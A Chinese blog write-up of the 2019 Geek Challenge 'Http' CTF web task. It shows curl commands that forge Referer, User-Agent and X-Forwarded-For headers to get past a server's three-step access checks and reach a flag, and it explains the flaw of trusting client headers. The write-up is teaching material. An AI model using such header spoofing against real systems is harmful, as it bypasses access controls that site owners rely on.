---
title: 极客大挑战 2019 - Web - Http
date: 2026-11-14 18:01:00
categories:
  - CTF
  - 极客大挑战 2019
  - Web
tags:
  - HTTP请求头伪造
  - Referer
  - X-Forwarded-For
  - User-Agent
cover: /img/cover/backless-girl-magnolia.jpg
description: HTTP 请求头伪造入门题，从首页源码隐藏链接进入 Secret.php，依次伪造 Referer、User-Agent 与 X-Forwarded-For 满足三重校验，以本地访问身份拿到 flag。
keywords:
  - Referer
  - User-Agent
  - XFF
  - HTTP头伪造
  - 极客大挑战
ai: >-
  本题是极客大挑战 2019 的 Web 基础题，考察 HTTP 请求头的伪造。查看首页源码可见正文末尾藏有指向 Secret.php 的隐藏链接。访问后服务端按三步逐层校验：先要求 Referer 来自指定域名，再要求 User-Agent 为 Syclover 浏览器，最后要求 X-Forwarded-For 为 127.0.0.1 以伪装本地访问。每步都可用 curl 的 -H 参数追加对应头通过，三者叠加后页面回显 flag。整题不涉及注入，核心是服务端把来源、浏览器与客户端 IP 这些本应可信的判断全交给客户端可任意伪造的请求头，属典型的 HTTP 信息收集教学案例。
copyright_author: Hunter
---

> 结论先行：首页源码藏 `Secret.php`，服务端依次校验 Referer、User-Agent、X-Forwarded-For 三个请求头，逐一用 curl `-H` 伪造后拿到 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 极客大挑战 2019 |
| 方向 | Web |
| 难度 | 简单 |
| 环境 | 授权靶场（已脱敏） |

知识点：常用 HTTP 请求头（Referer、User-Agent、X-Forwarded-For）。

## 信息收集

访问首页，查看源码，在正文末尾找到一个隐藏链接 `Secret.php`：

```html
<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>
```

## 漏洞分析

服务端把「请求来源、浏览器类型、客户端 IP」三个本应由服务端可信判断的条件，全部交给客户端可任意伪造的请求头，且按步提示、逐层放行。只要按顺序补齐三个头即可绕过，属于典型的「信任客户端输入」逻辑缺陷。

## 利用过程

### 1. 访问 Secret.php

直接访问 `Secret.php`，页面提示：

```text
It doesn't come from 'https://Sycsecret.buuoj.cn'
```

要求请求来源是 `https://Sycsecret.buuoj.cn`，即需伪造 `Referer` 头。

### 2. 伪造 Referer

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" http://target:8080/Secret.php
```

得到下一步提示：

```text
Please use "Syclover" browser
```

要求使用 `Syclover` 浏览器，即需伪造 `User-Agent` 头。

### 3. 伪造 User-Agent

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     http://target:8080/Secret.php
```

得到下一步提示：

```text
No!!! you can only read this locally!!!
```

要求本地访问，即需伪造 `X-Forwarded-For` 头。

### 4. 伪造 X-Forwarded-For 获取 flag

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     -H "X-Forwarded-For: 127.0.0.1" \
     http://target:8080/Secret.php
```

页面回显 flag。

## 完整 EXP

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     -H "X-Forwarded-For: 127.0.0.1" \
     http://target:8080/Secret.php
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

| 头字段 | 作用 | 本题用途 |
|---|---|---|
| `Referer` | 标识请求来源页面 | 伪装来自 `https://Sycsecret.buuoj.cn` |
| `User-Agent` | 标识客户端浏览器 | 伪装为 `Syclover` 浏览器 |
| `X-Forwarded-For` | 标识经代理转发的原始客户端 IP | 伪装为本地访问 `127.0.0.1` |

1. 三个条件依次满足后，服务端返回 flag。
2. 每一步的报错即为下一步的线索，按提示补齐请求头即可。
3. 这类「本地访问」判断用 XFF 伪造即可，说明服务端未区分真实 TCP 对端与代理头，是常见的信任边界错误。
